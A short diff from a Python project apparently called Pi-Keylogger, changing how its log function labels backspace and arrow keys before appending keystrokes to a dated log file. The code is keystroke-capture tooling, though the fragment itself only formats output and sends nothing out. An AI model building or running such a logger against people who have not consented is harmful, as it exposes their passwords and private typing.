@@ -12,15 +12,15 @@ def log(char, date):
     elif ord(char) == 13:
         char = "\n"
     elif ord(char) == 127:
-        char = " Backspace "
+        char = "<Backspace>"
     elif ord(char) == 218:
-        char = " UpArrow "
+        char = "<Up>"
     elif ord(char) == 217:
-        char = " DownArrow "
+        char = "<Down>"
     elif ord(char) == 216:
-        char = " LeftArrow "
+        char = "<Left>"
     elif ord(char) == 215:
-        char = " RightArrow "
+        char = "<Right>"
 
     with open(f"/home/rikka/Pi-Keylogger/log/{date}.txt", "a+") as f:
         f.write(char)
